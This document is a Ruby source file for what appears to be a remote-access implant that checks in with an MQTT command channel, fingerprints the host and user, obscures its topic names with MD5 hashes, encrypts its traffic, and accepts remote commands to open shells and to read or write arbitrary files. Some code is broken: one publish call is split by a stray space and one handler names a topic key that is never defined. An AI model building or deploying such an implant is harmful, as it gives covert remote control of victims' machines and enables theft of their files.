require 'paho-mqtt'
require 'securerandom'
require 'os'
require 'base64'

require_relative 'core/encryption'
require_relative 'core/serialization'

require_relative 'inators/remoteshell'
require_relative 'inators/filerw'

cipher = OpenSSL::Cipher::AES.new(128, :CTR)
aes = {
  :key => cipher.random_key,
  :iv => cipher.random_iv,
}

Encryption::AES.config({
	:key_lenght => 128,
	:mode => :CTR,
	:key => aes[:key],
	:iv => aes[:iv]
})

Encryption::Digest.config({
	:digest => "md5"
})

Serialization.config({

})

shinobi = {
	:id => SecureRandom.hex(2),
	:host => (OS.windows? ? `ver` : `uname -sr`).strip,
	:user => OS.windows? ? `whoami`.strip : `uname -n`.strip + '\\' + `whoami`.strip,
	:status => :offline,
	:aes => aes
}

mqtt_topics = {
	:public_key						=> "/bu/public_key",
	:shinobi							=> "/bu/shinobi/#{shinobi[:id]}",
	:remoteshell					=> "/bu/shinobi/#{shinobi[:id]}/inators/remoteshell",
	:remoteshell_open			=> "/bu/shinobi/#{shinobi[:id]}/inators/remoteshell/cmds/open",
	:remoteshell_close		=> "/bu/shinobi/#{shinobi[:id]}/inators/remoteshell/cmds/close",
	:remoteshell_write		=> "/bu/shinobi/#{shinobi[:id]}/inators/remoteshell/cmds/write",
	:remoteshell_onopen		=> "/bu/shinobi/#{shinobi[:id]}/inators/remoteshell/events/open",
	:remoteshell_onclose	=> "/bu/shinobi/#{shinobi[:id]}/inators/remoteshell/events/close",
	:remoteshell_onread		=> "/bu/shinobi/#{shinobi[:id]}/inators/remoteshell/events/read",
	:remoteshell_onwrite	=> "/bu/shinobi/#{shinobi[:id]}/inators/remoteshell/events/write",
	:remoteshell_onerror	=> "/bu/shinobi/#{shinobi[:id]}/inators/remoteshell/events/error",
	:filerw								=> "/bu/shinobi/#{shinobi[:id]}/inators/filerw",
	:filerw_read					=> "/bu/shinobi/#{shinobi[:id]}/inators/filerw/cmds/read",
	:filerw_write					=> "/bu/shinobi/#{shinobi[:id]}/inators/filerw/cmds/write",
	:filerw_onread				=> "/bu/shinobi/#{shinobi[:id]}/inators/filerw/events/read",
	:filerw_onwrite				=> "/bu/shinobi/#{shinobi[:id]}/inators/filerw/events/write",
	:filerw_error					=> "/bu/shinobi/#{shinobi[:id]}/inators/filerw/events/error"
}

mqtt_topics.each do |key, value|
	levels = value.split('/')
	levels.each_with_index do |level, index|
		if level != '+' && level != '#' then
			levels[index] = Encryption::Digest.digest(level)
		end
	end
	mqtt_topics[key] = levels.join('/')
end

mqtt_settings = {
	:host => 'localhost',
	:port => 1883,
	:persistent => true,
	:blocking => true,
	:reconnect_limit => 3,
	:reconnect_delay => 60,
	:will_topic => mqtt_topics[:shinobi],
	:will_payload => Base64.encode64(Encryption::AES.encrypt(Serialization.serialize(shinobi))),
	:will_qos => 2,
	:will_retain => false
}

mqtt_client = PahoMqtt::Client.new(mqtt_settings)
remoteshell_inator = Inator::RemoteShell.new
filerw_inator = Inator::FileReadWrite.new

mqtt_client.on_connack do
	mqtt_client.subscribe([mqtt_topics[:public_key], 2])
end

mqtt_client.add_topic_callback(mqtt_topics[:public_key]) do |packet|
	Encryption::RSA.config({
		:encoded_key => packet.payload
	})

  if shinobi[:status] == :offline then
    shinobi[:status] = :online
    Thread.new do
  		loop do
  			packet = Serialization.serialize(shinobi)
  			packet = Encryption::RSA.encrypt(packet)
  			mqtt_client.publish(mqtt_topics[:shinobi], packet, false, 1)
  			sleep mqtt_client.keep_alive
  		end
  	end
  end
end

mqtt_client.add_topic_callback(mqtt_topics[:remoteshell_open]) do |packet|
	packet = Encryption::AES.decrypt(packet.payload)
	packet = Serialization.deserialize(packet)
	remoteshell_inator.open(packet.shell)
end

mqtt_client.add_topic_callback(mqtt_topics[:remoteshell_close]) do |packet|
	packet = Encryption::AES.decrypt(packet.payload)
	packet = Serialization.deserialize(packet)
	remoteshell_inator.close(packet.pid)
end

mqtt_client.add_topic_callback(mqtt_topics[:remoteshell_write]) do |packet|
	packet = Encryption::AES.decrypt(packet.payload)
	packet = Serialization.deserialize(packet)
	remoteshell_inator.write(packet.pid, packet.data)
end

mqtt_client.add_topic_callback(mqtt_topics[:filerw_read]) do |packet|
	packet = Encryption::AES.decrypt(packet.payload)
	packet = Serialization.deserialize(packet)
	filerw_inator.read(packet.file, packet.length, packet.offset)
end

mqtt_client.add_topic_callback(mqtt_topics[:filerw_write]) do |packet|
	packet = Encryption::AES.decrypt(packet.payload)
	packet = Serialization.deserialize(packet)
	filerw_inator.write(packet.file, packet.data, packet.offset)
end

remoteshell_inator.on :open do |pid, shell|
	packet = {
		:pid => pid,
		:shell => shell
	}
	packet = Serialization.serialize(packet)
	packet = Encryption::AES.encrypt(packet)
	mqtt_client.publish(mqtt_topics[:remoteshell_onopen], packet, false, 1)
	remote_shells = []
	remoteshell_inator.remote_shells.each do |remote_shell|
		remote_shells << { :pid => remote_shell[2].pid, :shell => remote_shell[4] }
	end
	packet = {
		:remote_shells => remote_shells
	}
	packet = Serialization.serialize(packet)
	packet = Encryption::AES.encrypt(packet)
	mqtt_client.publish(mqtt_topics[:remoteshell], packet, false, 1)
end

remoteshell_inator.on :close do |pid|
	packet = {
		:pid => pid
	}
	packet = Serialization.serialize(packet)
	packet = Encryption::AES.encrypt(packet)
	mqtt_client.publish(mqtt_topics[:remoteshell_onclose], packet, false, 1)
	remote_shells = []
	remoteshell_inator.remote_shells.each do |remote_shell|
		remote_shells << { :pid => remote_shell[2].pid, :shell => remote_shell[4] }
	end
	packet = {
		:remote_shells => remote_shells
	}
	packet = Serialization.serialize(packet)
	packet = Encryption::AES.encrypt(packet)
	mqtt_client.publish(mqtt_topics[:remoteshell], packet, false, 1)
end

remoteshell_inator.on :read do |pid, data|
	packet = {
		:pid => pid,
		:data => data
	}
	packet = Serialization.serialize(packet)
	packet = Encryption::AES.encrypt(packet)
	mqtt_client.publish(mqtt_topics[:remoteshell_onread], packet, false, 1)
end

remoteshell_inator.on :write do |pid, data|
	packet = {
		:pid => pid,
		:data => data
	}
	packet = Serialization.serialize(packet)
	packet = Encryption::AES.encrypt(packet)
	mqtt_client.publish(mqtt_topics[:remoteshell_onwrite], packet, false, 1)
end

remoteshell_inator.on :error do |pid, error|
	packet = {
		:pid => pid,
		:error => error
	}
	packet = Serialization.serialize(packet)
	packet = Encryption::AES.encrypt(packet)
	mqtt_client.publish(mqtt_topics[:remoteshell_onerror], packet, false, 1)
end

filerw_inator.on :read do |file, length, offset, data|
	packet = {
		:file => file,
		:length => length,
		:offset => offset,
		:data => data
	}
	packet = Serialization.serialize(packet)
	packet = Encryption::AES.encrypt(packet)
	mqtt_client.publish(mqtt_topics[:filerw_onread], packet, false, 1)
end

filerw_inator.on :write do |file, data, offset, length|
	packet = {
		:file => file,
		:offset => offset,
		:length => length
	}
	packet = Serialization.serialize(packet)
	packet = Encryption::AES.encrypt(packet)
	mqtt_client.publish(mqtt_topics[:filerw_onwrite], packet, false, 1)
end

filerw_inator.on :error do |file, error|
	packet = {
		:file => file,
		:error => error
	}
	packet = Serialization.serialize(packet)
	packet = Encryption::AES.encrypt(packet)
	mqtt_client.publi sh(mqtt_topics[:filerw_onerror], packet, false, 1)
end

mqtt_client.connect(mqtt_client.host, mqtt_client.port, mqtt_client.keep_alive, mqtt_client.persistent, mqtt_client.blocking)

mqtt_topics.each do |key, value|
	if value.include? Encryption::Digest.digest('cmds') then
		mqtt_client.subscribe([value, 2])
		sleep 0.1
	end
end

loop do
	mqtt_client.loop_read
	mqtt_client.loop_write
end
